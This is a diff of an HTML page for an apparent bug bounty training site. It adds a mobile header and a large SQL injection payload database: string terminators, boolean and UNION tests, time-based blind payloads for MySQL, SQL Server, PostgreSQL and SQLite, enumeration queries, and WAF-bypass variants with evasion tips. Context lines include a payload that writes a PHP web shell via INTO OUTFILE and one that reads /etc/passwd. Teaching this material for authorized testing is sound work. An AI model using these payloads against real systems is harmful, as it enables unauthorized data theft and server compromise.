@@ -10,6 +10,20 @@
 </head>
 <body>
     <div class="app-container">
+        <!-- Mobile Header -->
+        <header class="mobile-header">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <span>Bug Bounty Bootcamp</span>
+            </div>
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <i class="fas fa-bars"></i>
+            </button>
+        </header>
+
+        <!-- Mobile Overlay -->
+        <div class="mobile-overlay" id="mobileOverlay"></div>
+
         <!-- Sidebar Navigation -->
         <nav class="sidebar">
             <div class="sidebar-header">
@@ -2898,6 +2912,390 @@
                                                 <code>' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/shell.php'--</code>
                                                 <code>' UNION SELECT HEX(LOAD_FILE('/etc/passwd')),null--</code>
                                             </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- SQL Injection Payloads Database -->
+                        <section class="content-section">
+                            <h2 id="sqli-payloads-database">
+                                <i class="fas fa-code"></i>
+                                SQL Injection Payloads Database
+                            </h2>
+                            
+                            <div class="content-block">
+                                <p class="lead">
+                                    Comprehensive collection of SQL injection payloads for various database systems and attack scenarios.
+                                </p>
+
+                                <div class="payloads-container">
+                                    <!-- Basic Injection Payloads -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-play"></i> Basic Injection Payloads</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>String Terminators</h5>
+                                                <div class="payload-list">
+                                                    <code>'</code>
+                                                    <code>''</code>
+                                                    <code>`</code>
+                                                    <code>``</code>
+                                                    <code>"</code>
+                                                    <code>""</code>
+                                                    <code>,</code>
+                                                    <code>/</code>
+                                                    <code>//</code>
+                                                    <code>\</code>
+                                                    <code>\\</code>
+                                                    <code>;</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>Basic Boolean Tests</h5>
+                                                <div class="payload-list">
+                                                    <code>' or "</code>
+                                                    <code>' OR '1</code>
+                                                    <code>' OR 1 -- -</code>
+                                                    <code>" OR "" = "</code>
+                                                    <code>" OR 1 = 1 -- -</code>
+                                                    <code>' OR '' = '</code>
+                                                    <code>'='</code>
+                                                    <code>'LIKE'</code>
+                                                    <code>' OR 'x'='x</code>
+                                                    <code>OR 1=1</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Comment Types -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-comment"></i> Comment Types</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>SQL Comments</h5>
+                                                <div class="payload-list">
+                                                    <code>-- or #</code>
+                                                    <code>#    Hash comment</code>
+                                                    <code>/*  	C-style comment</code>
+                                                    <code>-- -	SQL comment</code>
+                                                    <code>;%00	Nullbyte</code>
+                                                    <code>`	    Backtick</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Numeric Injection -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-hashtag"></i> Numeric Injection</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Numeric Tests</h5>
+                                                <div class="payload-list">
+                                                    <code>AND 1</code>
+                                                    <code>AND 0</code>
+                                                    <code>AND true</code>
+                                                    <code>AND false</code>
+                                                    <code>1-false</code>
+                                                    <code>1-true</code>
+                                                    <code>1*56</code>
+                                                    <code>-2</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Column Detection -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-columns"></i> Column Detection (ORDER BY)</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>ORDER BY Tests</h5>
+                                                <div class="payload-list">
+                                                    <code>1' ORDER BY 1--+</code>
+                                                    <code>1' ORDER BY 2--+</code>
+                                                    <code>1' ORDER BY 3--+</code>
+                                                    <code>1' ORDER BY 1,2--+</code>
+                                                    <code>1' ORDER BY 1,2,3--+</code>
+                                                    <code>ORDER BY 1--</code>
+                                                    <code>ORDER BY 10--</code>
+                                                    <code>ORDER BY 31337--</code>
+                                                    <code>ORDER BY 1#</code>
+                                                    <code>ORDER BY 30#</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- UNION SELECT Payloads -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-link"></i> UNION SELECT Payloads</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Basic UNION</h5>
+                                                <div class="payload-list">
+                                                    <code>-1' UNION SELECT 1,2,3--+</code>
+                                                    <code>' UNION SELECT sum(columnname ) from tablename --</code>
+                                                    <code>UNION ALL SELECT 1</code>
+                                                    <code>UNION ALL SELECT 1,2</code>
+                                                    <code>UNION ALL SELECT 1,2,3</code>
+                                                    <code>UNION ALL SELECT 1,2,3,4,5</code>
+                                                    <code>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Time-Based Blind SQL Injection -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-clock"></i> Time-Based Blind Injection</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>MySQL Sleep Functions</h5>
+                                                <div class="payload-list">
+                                                    <code>sleep(5)#</code>
+                                                    <code>1 or sleep(5)#</code>
+                                                    <code>" or sleep(5)#</code>
+                                                    <code>' or sleep(5)#</code>
+                                                    <code>1) or sleep(5)#</code>
+                                                    <code>') or sleep(5)='</code>
+                                                    <code>1)) or sleep(5)#</code>
+                                                    <code>SLEEP(5)#</code>
+                                                    <code>or SLEEP(5)</code>
+                                                    <code>,(select * from (select(sleep(10)))a)</code>
+                                                    <code>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>SQL Server WAITFOR</h5>
+                                                <div class="payload-list">
+                                                    <code>';WAITFOR DELAY '0:0:30'--</code>
+                                                    <code>';waitfor delay '0:0:5'--</code>
+                                                    <code>);waitfor delay '0:0:5'--</code>
+                                                    <code>';waitfor delay '0:0:5'--</code>
+                                                    <code>";waitfor delay '0:0:5'--</code>
+                                                    <code>');waitfor delay '0:0:5'--</code>
+                                                    <code>waitfor delay '00:00:05'</code>
+                                                    <code>waitfor delay '00:00:05'--</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>PostgreSQL pg_sleep</h5>
+                                                <div class="payload-list">
+                                                    <code>pg_sleep(5)--</code>
+                                                    <code>1 or pg_sleep(5)--</code>
+                                                    <code>" or pg_sleep(5)--</code>
+                                                    <code>' or pg_sleep(5)--</code>
+                                                    <code>1) or pg_sleep(5)--</code>
+                                                    <code>pg_SLEEP(5)</code>
+                                                    <code>or pg_SLEEP(5)</code>
+                                                    <code>or pg_SLEEP(5)--</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>MySQL Benchmark</h5>
+                                                <div class="payload-list">
+                                                    <code>benchmark(10000000,MD5(1))#</code>
+                                                    <code>1 or benchmark(10000000,MD5(1))#</code>
+                                                    <code>" or benchmark(10000000,MD5(1))#</code>
+                                                    <code>' or benchmark(10000000,MD5(1))#</code>
+                                                    <code>benchmark(50000000,MD5(1))</code>
+                                                    <code>or benchmark(50000000,MD5(1))</code>
+                                                    <code>+benchmark(3200,SHA1(1))+'</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Boolean-Based Blind Injection -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-question-circle"></i> Boolean-Based Blind Injection</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Conditional Statements</h5>
+                                                <div class="payload-list">
+                                                    <code>OR 1=1</code>
+                                                    <code>OR 1=0</code>
+                                                    <code>OR x=x</code>
+                                                    <code>OR x=y</code>
+                                                    <code>OR 1=1#</code>
+                                                    <code>OR 1=0#</code>
+                                                    <code>OR 1=1--</code>
+                                                    <code>OR 1=0--</code>
+                                                    <code>AND 1=1</code>
+                                                    <code>AND 1=0</code>
+                                                    <code>AND 1=1--</code>
+                                                    <code>AND 1=0--</code>
+                                                    <code>HAVING 1=1</code>
+                                                    <code>HAVING 1=0</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>Advanced Boolean Tests</h5>
+                                                <div class="payload-list">
+                                                    <code>AND 1083=1083 AND (1427=1427</code>
+                                                    <code>AND 7506=9091 AND (5913=5913</code>
+                                                    <code>AND 7300=7300 AND 'pKlZ'='pKlZ</code>
+                                                    <code>AND 7300=7300 AND 'pKlZ'='pKlY</code>
+                                                    <code>WHERE 1=1 AND 1=1</code>
+                                                    <code>WHERE 1=1 AND 1=0</code>
+                                                    <code>AS INJECTX WHERE 1=1 AND 1=1</code>
+                                                    <code>AS INJECTX WHERE 1=1 AND 1=0</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Database Enumeration -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-database"></i> Database Enumeration</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Version Detection</h5>
+                                                <div class="payload-list">
+                                                    <code>' AND MID(VERSION(),1,1) = '5';</code>
+                                                    <code>and (select substring(@@version,1,1))='X'</code>
+                                                    <code>and (select substring(@@version,1,1))='M'</code>
+                                                    <code>and (select substring(@@version,2,1))='i'</code>
+                                                    <code>and (select substring(@@version,2,1))='y'</code>
+                                                    <code>and (select substring(@@version,3,1))='c'</code>
+                                                    <code>and (select substring(@@version,3,1))='S'</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>Table Discovery</h5>
+                                                <div class="payload-list">
+                                                    <code>' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</code>
+                                                    <code>1 AND (SELECT * FROM Users) = 1</code>
+                                                    <code>' AND id IS NULL; --</code>
+                                                    <code>' GROUP BY columnnames having 1=1 --</code>
+                                                    <code>1' GROUP BY 1,2,--+</code>
+                                                    <code>1' GROUP BY 1,2,3--+</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- SQLite Specific -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-cube"></i> SQLite Specific Payloads</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>SQLite Functions</h5>
+                                                <div class="payload-list">
+                                                    <code>RANDOMBLOB(500000000/2)</code>
+                                                    <code>AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</code>
+                                                    <code>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</code>
+                                                    <code>RANDOMBLOB(1000000000/2)</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Advanced Techniques -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-cogs"></i> Advanced Techniques</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Encoding & Special Characters</h5>
+                                                <div class="payload-list">
+                                                    <code>%00</code>
+                                                    <code>%2c(select%20*%20from%20(select(sleep(10)))a)</code>
+                                                    <code>'\"</code>
+                                                    <code>@variable	local variable</code>
+                                                    <code>@@variable	global variable</code>
+                                                    <code>+		addition, concatenate</code>
+                                                    <code>||		(double pipe) concatenate</code>
+                                                    <code>%		wildcard attribute indicator</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>Complex Conditional Logic</h5>
+                                                <div class="payload-list">
+                                                    <code>RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))</code>
+                                                    <code>IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--</code>
+                                                    <code>IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--</code>
+                                                    <code>%' AND 8310=8310 AND '%'='</code>
+                                                    <code>%' AND 8310=8311 AND '%'='</code>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="payload-block">
+                                                <h5>Multi-Vector Payloads</h5>
+                                                <div class="payload-list">
+                                                    <code>SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/</code>
+                                                    <code>'''''''''''''UNION SELECT '2</code>
+                                                    <code>-1 UNION SELECT 1 INTO @,@</code>
+                                                    <code>-1 UNION SELECT 1 INTO @,@,@</code>
+                                                    <code>+ SLEEP(10) + '</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Bypass Techniques -->
+                                    <div class="payload-section">
+                                        <h4><i class="fas fa-shield-alt"></i> WAF Bypass Techniques</h4>
+                                        <div class="payload-grid">
+                                            <div class="payload-block">
+                                                <h5>Case Variation & Keywords</h5>
+                                                <div class="payload-list">
+                                                    <code>AnD SLEEP(5)</code>
+                                                    <code>&&SLEEP(5)</code>
+                                                    <code>' AnD SLEEP(5) ANd '1</code>
+                                                    <code>'&&SLEEP(5)&&'1</code>
+                                                    <code>ORDER BY SLEEP(5)</code>
+                                                    <code>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)</code>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="payload-usage-tips">
+                                    <h4><i class="fas fa-lightbulb"></i> Payload Usage Tips</h4>
+                                    <div class="tips-grid">
+                                        <div class="tip-card">
+                                            <h5>Testing Strategy</h5>
+                                            <ul>
+                                                <li>Start with basic string terminators</li>
+                                                <li>Progress to boolean-based tests</li>
+                                                <li>Use ORDER BY to detect column count</li>
+                                                <li>Apply UNION SELECT for data extraction</li>
+                                                <li>Implement time-based for blind scenarios</li>
+                                            </ul>
+                                        </div>
+                                        
+                                        <div class="tip-card">
+                                            <h5>WAF Evasion</h5>
+                                            <ul>
+                                                <li>Mix upper and lowercase</li>
+                                                <li>Use alternative comment styles</li>
+                                                <li>Apply encoding techniques</li>
+                                                <li>Utilize whitespace variations</li>
+                                                <li>Fragment keywords across parameters</li>
+                                            </ul>
+                                        </div>
+                                        
+                                        <div class="tip-card">
+                                            <h5>Database-Specific</h5>
+                                            <ul>
+                                                <li>MySQL: Use SLEEP() and benchmark()</li>
+                                                <li>PostgreSQL: Use pg_sleep()</li>
+                                                <li>SQL Server: Use WAITFOR DELAY</li>
+                                                <li>Oracle: Use DBMS_LOCK.SLEEP</li>
+                                                <li>SQLite: Use RANDOMBLOB for delays</li>
+                                            </ul>
                                         </div>
                                     </div>
                                 </div>
